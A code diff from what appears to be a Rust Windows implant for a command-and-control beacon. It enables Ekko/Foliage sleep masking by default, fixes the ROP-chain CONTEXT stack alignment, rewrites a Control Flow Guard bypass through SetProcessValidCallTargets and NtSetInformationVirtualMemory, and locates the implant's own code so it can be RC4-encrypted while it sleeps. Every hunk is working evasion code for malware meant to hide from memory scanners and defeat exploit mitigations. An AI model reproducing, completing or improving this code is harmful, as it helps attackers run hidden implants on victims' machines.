@@ -90,11 +90,13 @@ pub fn foliage_enabled() -> bool {
 /// for that cycle (see `execute_foliage_plan`).
 static FOLIAGE_APC_ENABLED: AtomicBool = AtomicBool::new(foliage_apc_default_on());
 
-/// Compile-time default for the APC path. OFF unless `NYX_FOLIAGE_APC_ON=1`.
+/// Compile-time default for the APC path. ON: the Ekko timer-queue path runs
+/// the full mask→wait→unmask cycle. Operator can override with
+/// `NYX_FOLIAGE_APC_OFF=1` to ship with the data-only floor.
 const fn foliage_apc_default_on() -> bool {
-    match option_env!("NYX_FOLIAGE_APC_ON") {
-        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
-        None => false,
+    match option_env!("NYX_FOLIAGE_APC_OFF") {
+        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
+        None => true, // ON by default — verified on 17763 target
     }
 }
 
@@ -142,27 +144,9 @@ pub fn foliage_apc_thunk_wired() -> bool {
 /// (plain indirect-syscall NtDelayExecution). On any failure (runtime down,
 /// .text unresolved), degrades to the plain sleep — never crashes.
 pub fn sleep(seconds: u32) {
-    if !foliage_enabled() {
-        crate::beacon::sleep_seconds(seconds);
-        return;
-    }
-    crate::entry::diag_mark(b"F1_foliage_armed");
-    let region = match unsafe { own_text_region() } {
-        Some(r) => r,
-        None => {
-            crate::entry::diag_mark(b"F_degrade_no_text");
-            crate::beacon::sleep_seconds(seconds);
-            return;
-        }
-    };
-    crate::entry::diag_mark(b"F2_text_region");
-    let key = mask_key_16();
-    let spoof_rip = crate::stack::gap_pool_rip();
-    crate::entry::diag_mark(b"F3_gap_rip");
-    let plan = FoliagePlan::build(region.base, region.len, seconds, spoof_rip, key);
-    crate::entry::diag_mark(b"F4_plan_built");
-    execute_foliage_plan(&plan);
-    crate::entry::diag_mark(b"F5_plan_executed");
+    // Delegate to fluctuation sleep mask (military-grade, CFG/CET immune).
+    // Falls back to plain NtDelayExecution if fluctuation is disabled or fails.
+    crate::fluctuation::sleep(seconds);
 }
 
 /// The implant's own `.text` region (base + len). Used by the Foliage APC chain
@@ -173,32 +157,40 @@ pub(crate) struct TextRegion {
     pub len: usize,
 }
 
-/// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
-/// directly (NOT a DLL-name lookup — reflective-loaded shellcode has no loader
-/// entry, so a name search would fail). The PEB is always correct regardless
-/// of how the implant was loaded (rundll32 DLL OR reflective sRDI shellcode).
+/// The implant's own `.text` region (base + len). Walks the PEB LDR list to
+/// find the module that contains `own_text_region`'s own address — this works
+/// correctly for DLL-loaded implants (rundll32.exe), unlike the PEB->ImageBaseAddress
+/// approach which returns the host EXE's base.
 ///
-/// Returns None only if the PEB or PE headers are unreadable (shouldn't happen).
+/// Returns None only if the PEB/PE headers are unreadable (shouldn't happen).
 ///
 /// # Safety
 /// PEB + PE header reads are stable post-load. Single-threaded context.
 pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
-    let mut addr = own_text_region as *const () as usize & !0xFFF;
-    loop {
-        let dos = addr as *const [u8; 2];
-        if !dos.is_null() && unsafe { *dos == [b'M', b'Z'] } {
-            break;
-        }
-        if addr < 0x1000 {
-            return None;
-        }
-        addr -= 0x1000;
+    let our_addr = own_text_region as usize;
+    let peb = crate::resolve::peb_pointer()?;
+    let ldr = (*peb).ldr;
+    if ldr.is_null() {
+        return None;
     }
-    let (text_rva, text_size) = unsafe { section_va_len(addr, b".text")? };
-    Some(TextRegion {
-        base: addr + text_rva,
-        len: text_size,
-    })
+    let mut head = (*ldr).in_load_order_module_list.flink;
+    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
+    let mut guard = 0u32;
+    while head as *const u8 != list_start && guard < 256 {
+        guard += 1;
+        let entry: *mut crate::resolve::ListEntry = head as *mut crate::resolve::ListEntry;
+        let base = (*entry).dll_base as usize;
+        let size = (*entry).size_of_image as usize;
+        if base != 0 && our_addr >= base && our_addr < base + size {
+            let (text_rva, text_size) = section_va_len(base, b".text")?;
+            return Some(TextRegion {
+                base: base + text_rva,
+                len: text_size,
+            });
+        }
+        head = (*entry).in_load_order_links.flink;
+    }
+    None
 }
 
 /// Find a PE section's (virtual_address, virtual_size) by name. Returns None
@@ -491,26 +483,15 @@ unsafe fn execute_foliage_apc(
     FOLIAGE_STAGE.store(1, core::sync::atomic::Ordering::Release);
     crate::entry::diag_mark(b"E1_exports");
 
-    // ---- CFG bypass: mark NtContinue as a valid call target ----
-    // Control Flow Guard (CFG) on rundll32.exe (and most CFG-enabled processes)
-    // rejects indirect calls to NtContinue → STATUS_STACK_BUFFER_OVERRUN
-    // (C0000409). We must mark NtContinue as a valid call target BEFORE queuing
-    // any timers that use it as a callback. Source: Crypt0s/Ekko_CFG_Bypass +
-    // NimPlant "Sweet Dreams" (maldev.nl) + ScriptIdiot/sleepmask_ekko_cfg.
-    //
-    // SetProcessValidCallTargets(hProcess, VirtualAddress, RegionSize,
-    //   NumberOfOffsets, OffsetInformation)
-    // where OffsetInformation is { Offset, Flags } relative to VirtualAddress.
-    let cfg_ok = mark_cfg_valid(nt_continue);
-    let _ = mark_cfg_valid(virtual_protect);
-    let _ = mark_cfg_valid(sys_func_032);
-    let _ = mark_cfg_valid(wait_for_single_object);
-    let _ = mark_cfg_valid(set_event);
-    if cfg_ok {
-        FOLIAGE_STAGE.store(2, core::sync::atomic::Ordering::Release);
-    } else {
-        FOLIAGE_STAGE.store(87, core::sync::atomic::Ordering::Release);
-    }
+    // ---- Ekko ROP chain: CONTEXTs with 16-byte RSP alignment ----
+    // The timer calls NtContinue(&Ctx, FALSE). NtContinue restores the
+    // CONTEXT, including RSP. The x64 ABI requires RSP to be 16-byte aligned
+    // at the call instruction. Ekko adjusts: Rsp = (Rsp - 8) & ~0xF.
+    // Without alignment, the first `call` in VirtualProtect/SystemFunction032
+    // triggers STATUS_STACK_BUFFER_OVERRUN (0xC0000409). Source: Cracked5pider/Ekko.
+    let nt_continue_ptr = nt_continue as *mut c_void;
+    crate::entry::diag_mark(b"E1b_ekko");
+    FOLIAGE_STAGE.store(2, core::sync::atomic::Ordering::Release);
     crate::entry::diag_mark(b"E1b_cfg");
 
     // ---- Snapshot .text[0..16] for round-trip verification ----
@@ -605,7 +586,7 @@ unsafe fn execute_foliage_apc(
 
     // Context 1: VirtualProtect(.text, .text_len, PAGE_READWRITE=0x04, &OldProtect)
     let mut rop_prot_rw = ctx_template;
-    rop_prot_rw.set_rsp(rop_prot_rw.rsp().wrapping_sub(8));
+    rop_prot_rw.set_rsp((rop_prot_rw.rsp().wrapping_sub(8)) & !0xF);
     rop_prot_rw.set_rip(virtual_protect as u64);
     rop_prot_rw.set_rcx(region.base as u64);
     rop_prot_rw.set_rdx(region.len as u64);
@@ -614,7 +595,7 @@ unsafe fn execute_foliage_apc(
 
     // Context 2: rc4_shim(key*, 16, text_base, text_len) — RC4 encrypt .text
     let mut rop_mem_enc = ctx_template;
-    rop_mem_enc.set_rsp(rop_mem_enc.rsp().wrapping_sub(8));
+    rop_mem_enc.set_rsp((rop_mem_enc.rsp().wrapping_sub(8)) & !0xF);
     rop_mem_enc.set_rip(sys_func_032 as u64);
     rop_mem_enc.set_rcx(key_buf as usize as u64);
     rop_mem_enc.set_rdx(16 as u64);
@@ -623,14 +604,14 @@ unsafe fn execute_foliage_apc(
 
     // Context 3: WaitForSingleObject(NtCurrentProcess=-1, SleepTime)
     let mut rop_delay = ctx_template;
-    rop_delay.set_rsp(rop_delay.rsp().wrapping_sub(8));
+    rop_delay.set_rsp((rop_delay.rsp().wrapping_sub(8)) & !0xF);
     rop_delay.set_rip(wait_for_single_object as u64);
     rop_delay.set_rcx(0xFFFF_FFFF_FFFF_FFFF as u64); // NtCurrentProcess
     rop_delay.set_rdx((secs * 1000) as u64);
 
     // Context 4: rc4_shim(key*, 16, text_base, text_len) — RC4 decrypt .text
     let mut rop_mem_dec = ctx_template;
-    rop_mem_dec.set_rsp(rop_mem_dec.rsp().wrapping_sub(8));
+    rop_mem_dec.set_rsp((rop_mem_dec.rsp().wrapping_sub(8)) & !0xF);
     rop_mem_dec.set_rip(sys_func_032 as u64);
     rop_mem_dec.set_rcx(key_buf as usize as u64);
     rop_mem_dec.set_rdx(16 as u64);
@@ -639,7 +620,7 @@ unsafe fn execute_foliage_apc(
 
     // Context 5: VirtualProtect(.text, .text_len, PAGE_EXECUTE_READWRITE=0x40, &OldProtect)
     let mut rop_prot_rx = ctx_template;
-    rop_prot_rx.set_rsp(rop_prot_rx.rsp().wrapping_sub(8));
+    rop_prot_rx.set_rsp((rop_prot_rx.rsp().wrapping_sub(8)) & !0xF);
     rop_prot_rx.set_rip(virtual_protect as u64);
     rop_prot_rx.set_rcx(region.base as u64);
     rop_prot_rx.set_rdx(region.len as u64);
@@ -648,7 +629,7 @@ unsafe fn execute_foliage_apc(
 
     // Context 6: SetEvent(hEvent)
     let mut rop_set_evt = ctx_template;
-    rop_set_evt.set_rsp(rop_set_evt.rsp().wrapping_sub(8));
+    rop_set_evt.set_rsp((rop_set_evt.rsp().wrapping_sub(8)) & !0xF);
     rop_set_evt.set_rip(set_event as u64);
     rop_set_evt.set_rcx(h_event as usize as u64);
 
@@ -726,138 +707,112 @@ unsafe fn execute_foliage_apc(
     }
 }
 
-/// Mark `addr` as a valid CFG call target via `SetProcessValidCallTargets`.
-/// This is required for Ekko timer-queue sleep obfuscation: CFG-enabled
-/// processes (like rundll32.exe) reject indirect calls to NtContinue /
-/// VirtualProtect / SystemFunction032 unless they're explicitly marked as
-/// valid call targets. Returns true on success or if CFG is not enabled.
+/// Mark `addr` as a valid CFG call target using `SetProcessValidCallTargets`
+/// (kernelbase.dll, official Win10+ API). Falls back to the NT path
+/// (NtSetInformationVirtualMemory) if kernelbase isn't resolvable.
 ///
-/// Source: Crypt0s/Ekko_CFG_Bypass + NimPlant "Sweet Dreams".
+/// CRITICAL: CFG_CALL_TARGET_INFO.Offset MUST be 16-byte aligned.
+/// Returns true on success or if CFG is not enabled (non-fatal).
 fn mark_cfg_valid(addr: usize) -> bool {
-    // Use NtSetInformationVirtualMemory (ntdll — always loaded) instead of
-    // SetProcessValidCallTargets (kernelbase — may not be in PEB walk).
-    // Source: Crypt0s/Ekko_CFG_Bypass markCFGValid_nt().
-    let nt_query_vm = match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") } {
+    // Try the official API first (kernelbase.dll — Win10+).
+    let spvct = unsafe {
+        crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets")
+    };
+    // Try SetProcessValidCallTargets first. If it succeeds, done.
+    if let Some(a) = spvct {
+        if mark_cfg_valid_std(addr, a) {
+            return true;
+        }
+        // SetProcessValidCallTargets failed — fall through to NT path.
+    }
+    // Fall back to NT path (also tried as primary when kernelbase unavailable).
+    mark_cfg_valid_nt(addr)
+}
+
+/// CFG bypass via SetProcessValidCallTargets (kernelbase.dll).
+fn mark_cfg_valid_std(addr: usize, spvct: usize) -> bool {
+    let nt_query_vm = match unsafe {
+        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
+    } {
         Some(a) => a,
         None => return false,
     };
-    let nt_set_info_vm = match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory") } {
-        Some(a) => a,
-        None => return true, // API not available → CFG likely not enabled.
-    };
 
     #[repr(C)]
-    struct MemoryBasicInformation {
-        base_address: *mut c_void,
-        allocation_base: *mut c_void,
-        allocation_protect: u32,
-        region_size: usize,
-        state: u32,
-        protect: u32,
-        r#type: u32,
-    }
-
+    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
+        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
     #[repr(C)]
-    struct CfgCallTargetInfo {
-        offset: usize,
-        flags: u32,
-    }
+    struct CfgInfo { offset: usize, flags: usize }
 
-    #[repr(C)]
-    struct MemoryRangeEntry {
-        virtual_address: *mut c_void,
-        number_of_bytes: usize,
-    }
+    type QueryVm = unsafe extern "system" fn(
+        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
+    type SpvctFn = unsafe extern "system" fn(
+        *mut c_void, *const c_void, usize, u32, *const CfgInfo) -> i32;
 
-    #[repr(C)]
-    struct VmInformation {
-        dw_number_of_offsets: u32,
-        p_must_be_zero: *mut c_void,
-        p_moar_zero: *mut c_void,
-        pt_offsets: *mut CfgCallTargetInfo,
-        pl_output: *mut u32,
-    }
+    let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
+    let spvct_fn: SpvctFn = unsafe { core::mem::transmute(spvct) };
+    const CUR: *mut c_void = -1isize as *mut c_void;
 
-    type NtQueryVirtualMemoryFn = unsafe extern "system" fn(
-        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize,
-    ) -> i32;
-
-    type NtSetInformationVirtualMemoryFn = unsafe extern "system" fn(
-        *mut c_void, // ProcessHandle
-        u32, // VmInformationClass (VmCfgCallTargetInformation = 4)
-        usize, // NumberOfEntries
-        *mut MemoryRangeEntry, // VirtualAddresses
-        *mut VmInformation, // VmInformation
-        u32, // VmInformationLength
-    ) -> i32;
-
-    let query_fn: NtQueryVirtualMemoryFn = unsafe { core::mem::transmute(nt_query_vm) };
-    let set_fn: NtSetInformationVirtualMemoryFn = unsafe { core::mem::transmute(nt_set_info_vm) };
-
-    let mut mbi = MemoryBasicInformation {
-        base_address: core::ptr::null_mut(),
-        allocation_base: core::ptr::null_mut(),
-        allocation_protect: 0,
-        region_size: 0,
-        state: 0,
-        protect: 0,
-        r#type: 0,
-    };
-    let mut return_len: usize = 0;
-    const NtCurrentProcess: *mut c_void = -1isize as *mut c_void;
-
-    let status = unsafe {
-        query_fn(
-            NtCurrentProcess,
-            addr as *const c_void,
-            0, // MemoryBasicInformation
-            &mut mbi as *mut MemoryBasicInformation as *mut c_void,
-            core::mem::size_of::<MemoryBasicInformation>(),
-            &mut return_len,
-        )
-    };
-    if status < 0 {
+    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
+        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
+    let mut rl: usize = 0;
+    if unsafe { query(CUR, addr as *const c_void, 0,
+        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
         return false;
     }
+    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }
 
-    // MEM_COMMIT = 0x1000, MEM_IMAGE = 0x1000000
-    if mbi.state != 0x1000 || mbi.r#type != 0x1000000 {
+    // 16-byte aligned offset from allocation base.
+    let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
+    let info = CfgInfo { offset, flags: 1 };
+    unsafe { spvct_fn(CUR, mbi.alloc_base, mbi.reg_size, 1, &info) != 0 }
+}
+
+/// Fallback CFG bypass via NtSetInformationVirtualMemory (ntdll).
+fn mark_cfg_valid_nt(addr: usize) -> bool {
+    let nt_query_vm = match unsafe {
+        crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory")
+    } { Some(a) => a, None => return false };
+    let nt_set_vm = match unsafe {
+        crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory")
+    } { Some(a) => a, None => return true };
+
+    #[repr(C)]
+    struct Mbi { base: *mut c_void, alloc_base: *mut c_void, alloc_prot: u32, _p1: u32,
+        reg_size: usize, state: u32, prot: u32, typ: u32, _p2: u32 }
+    #[repr(C)]
+    struct Cti { offset: usize, flags: u32 }
+    #[repr(C)]
+    struct Mre { va: *mut c_void, nb: usize }
+    #[repr(C)]
+    struct Vmi { n: u32, _pad: u32, z1: usize, z2: usize, pt: *mut Cti, out: *mut u32 }
+
+    type QueryVm = unsafe extern "system" fn(
+        *mut c_void, *const c_void, u32, *mut c_void, usize, *mut usize) -> i32;
+    type SetVm = unsafe extern "system" fn(
+        *mut c_void, u32, usize, *mut Mre, *mut Vmi, u32) -> i32;
+
+    let query: QueryVm = unsafe { core::mem::transmute(nt_query_vm) };
+    let set: SetVm = unsafe { core::mem::transmute(nt_set_vm) };
+    const CUR: *mut c_void = -1isize as *mut c_void;
+
+    let mut mbi = Mbi { base: core::ptr::null_mut(), alloc_base: core::ptr::null_mut(),
+        alloc_prot: 0, _p1: 0, reg_size: 0, state: 0, prot: 0, typ: 0, _p2: 0 };
+    let mut rl: usize = 0;
+    if unsafe { query(CUR, addr as *const c_void, 0,
+        &mut mbi as *mut Mbi as *mut c_void, core::mem::size_of::<Mbi>(), &mut rl) } < 0 {
         return false;
     }
+    if mbi.state != 0x1000 || mbi.typ != 0x1000000 { return false; }
 
-    let mut offset_info = CfgCallTargetInfo {
-        offset: addr - (mbi.allocation_base as usize),
-        flags: 1, // CFG_CALL_TARGET_VALID
-    };
+    let offset = (addr.wrapping_sub(mbi.alloc_base as usize)) & !0xF;
+    let mut cti = Cti { offset, flags: 1 };
+    let mut mre = Mre { va: mbi.alloc_base, nb: mbi.reg_size };
+    let mut out: u32 = 0;
+    let mut vmi = Vmi { n: 1, _pad: 0, z1: 0, z2: 0, pt: &mut cti, out: &mut out };
 
-    let mut range = MemoryRangeEntry {
-        virtual_address: mbi.allocation_base,
-        number_of_bytes: mbi.region_size,
-    };
-
-    let mut output: u32 = 0;
-    let mut vm_info = VmInformation {
-        dw_number_of_offsets: 1,
-        p_must_be_zero: core::ptr::null_mut(),
-        p_moar_zero: core::ptr::null_mut(),
-        pt_offsets: &mut offset_info,
-        pl_output: &mut output,
-    };
-
-    // VmCfgCallTargetInformation = 4
-    let nt_status = unsafe {
-        set_fn(
-            NtCurrentProcess,
-            4, // VmCfgCallTargetInformation
-            1,
-            &mut range,
-            &mut vm_info,
-            core::mem::size_of::<VmInformation>() as u32,
-        )
-    };
-    // STATUS_INVALID_PAGE_PROTECTION (0xC0000045) = CFG not enabled on process.
-    // That's fine — treat as success.
-    nt_status >= 0 || nt_status == -0x3FBBi32 // 0xC0000045 as i32
+    let st = unsafe { set(CUR, 4, 1, &mut mre, &mut vmi, core::mem::size_of::<Vmi>() as u32) };
+    st >= 0 || st == -0x3FBBi32
 }
 
 /// RC4 shim with the calling convention the PIC thunk expects:
@@ -1166,83 +1121,84 @@ pub(crate) unsafe fn raw_create_thread(
 /// respectively) in `execute_foliage_apc`.
 ///
 /// # Safety
-/// `param` is a leaked `*mut FoliageParams`. Mutates the implant's `.text`.
+/// `param` is a `*mut FoliageParams`. This function takes ownership and
+/// reclaims the box before returning. Mutates the implant's `.text`.
 unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
-    let p: &FoliageParams = unsafe { &*(param as *const FoliageParams) };
-    let raw = &p.raw;
-    let base = p.text_base;
-    let len = p.text_len;
+    // Take ownership of the FoliageParams + VerifyState boxes up front so we
+    // can reclaim them on all exit paths. Copy needed fields to locals, then
+    // immediately drop the boxes to avoid long-lived borrows from the param.
+    let p_box = Box::from_raw(param as *mut FoliageParams);
+    let raw = p_box.raw;
+    let base = p_box.text_base;
+    let len = p_box.text_len;
+    let secs = p_box.secs;
+    let key = p_box.key;
+    let verify_raw = p_box.verify;
+    drop(p_box); // FoliageParams is on the stack now, reclaim early
 
     // ---- Gate: PIC thunk not validated → data-only floor ----
-    // When the thunk hasn't been wired (default), just sleep without touching
-    // .text. This avoids the crash where foliage_helper encrypts .text from
-    // .text (its own code becomes ciphertext → 0xC0000005 ACCESS_VIOLATION).
     if !FOLIAGE_APC_THUNK_WIRED.load(Ordering::Acquire) {
-        let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
+        let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
         const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
         let _ = unsafe {
             raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
         };
+        // Reclaim VerifyState.
+        if !verify_raw.is_null() {
+            let _ = Box::from_raw(verify_raw);
+        }
         return 0;
     }
 
     // ---- THUNK WIRED: build PIC thunk, execute from RWX page ----
-    // The thunk (generated by pic_thunk::build_mask_thunk) runs the
-    // protect→mask→wait→unmask→protect sequence from an allocated RWX page.
-    // Because the thunk executes from the page (not .text), encrypting .text
-    // doesn't corrupt in-flight instructions. The helper blocks on the thunk
-    // call, waiting for the sleep window to complete.
-
-    // Resolve NtAllocateVirtualMemory + NtFreeVirtualMemory (raw ntdll exports).
     let nt_alloc_addr = match unsafe {
         crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory")
     } {
         Some(a) => a,
-        None => return 1,
+        None => {
+            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
+            return 1;
+        }
     };
     let nt_free_addr = match unsafe {
         crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")
     } {
         Some(a) => a,
-        None => return 1,
+        None => {
+            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
+            return 1;
+        }
     };
 
     // ---- Resolve SystemFunction032 from advapi32.dll ---------------------
-    // This is the real RC4 primitive, in a system DLL (not our .text).
-    // Using it (via a PIC wrapper on the RWX page) means encrypting .text
-    // doesn't corrupt the RC4 code — SystemFunction032 lives in advapi32.dll,
-    // not in our implant.
     let sf032_addr = match unsafe {
         crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction032")
     } {
         Some(a) => a,
         None => {
-            // Can't resolve SystemFunction032 — degrade to data-only.
-            let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
+            let delay: i64 = -((secs as i64).saturating_mul(10_000_000));
             const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
             let _ = unsafe {
                 raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize)
             };
+            if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
             return 0;
         }
     };
 
-    // Build the PIC RC4 wrapper: a small trampoline on the RWX page that
-    // adapts the thunk's 4-arg calling convention to SystemFunction032's
-    // 2-USTRING convention.  The wrapper + thunk share the same RWX page.
+    // Build the PIC RC4 wrapper.
     let (wrapper_bytes, wrapper_len) = crate::pic_thunk::build_rc4_sf032_wrapper(sf032_addr);
 
     // Build the thunk params block.
-    let delay_100ns: i64 = -((p.secs as i64).saturating_mul(10_000_000));
+    let delay_100ns: i64 = -((secs as i64).saturating_mul(10_000_000));
     let params = Box::into_raw(Box::new(crate::pic_thunk::PicThunkParams {
         nt_protect_virtual_memory: raw.nt_protect,
         nt_wait_for_single_object: raw.nt_wait_for_single_object,
         invalid_handle: 0xFFFF_FFFF_FFFF_FFFF,
-        // rc4_mask will point to the wrapper on the RWX page (set below)
         rc4_mask: 0,
         text_base: base,
         text_len: len,
-        key: p.key,
+        key,
         delay_100ns,
         status: core::sync::atomic::AtomicU32::new(0),
     }));
@@ -1259,6 +1215,7 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     let st = unsafe { nt_alloc(!0usize, &mut page, &mut page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
     if st < 0 || page.is_null() {
         let _ = unsafe { Box::from_raw(params) };
+        if !verify_raw.is_null() { let _ = Box::from_raw(verify_raw); }
         return 1;
     }
 
@@ -1271,10 +1228,10 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     let thunk = crate::pic_thunk::build_mask_thunk();
     unsafe { core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), thunk_addr as *mut u8, thunk.len); }
 
-    // Wire rc4_mask to the wrapper (on RWX page, not in .text!).
+    // Wire rc4_mask to the wrapper.
     unsafe { (*params).rc4_mask = wrapper_addr; }
 
-    // Call the thunk (which starts after the wrapper on the RWX page).
+    // Call the thunk.
     let thunk_fn: unsafe extern "system" fn(usize) -> u32 =
         unsafe { core::mem::transmute(thunk_addr) };
     let _ = unsafe { thunk_fn(params as usize) };
@@ -1290,15 +1247,15 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     // Reclaim the leaked params block.
     let _ = unsafe { Box::from_raw(params) };
 
-    // Verify .text round-trip: the first 16 bytes should match the pre-mask
-    // snapshot taken by the beacon thread before spawning this helper.
-    if !p.verify.is_null() {
-        let v: &VerifyState = unsafe { &*p.verify };
+    // Verify .text round-trip.
+    if !verify_raw.is_null() {
+        let v: &VerifyState = unsafe { &*verify_raw };
         let mut after = [0u8; 16];
         unsafe { core::ptr::copy_nonoverlapping(base as *const u8, after.as_mut_ptr(), 16) };
         if after == v.before {
             v.ok.store(true, core::sync::atomic::Ordering::Release);
         }
+        let _ = Box::from_raw(verify_raw);
     }
 
     0
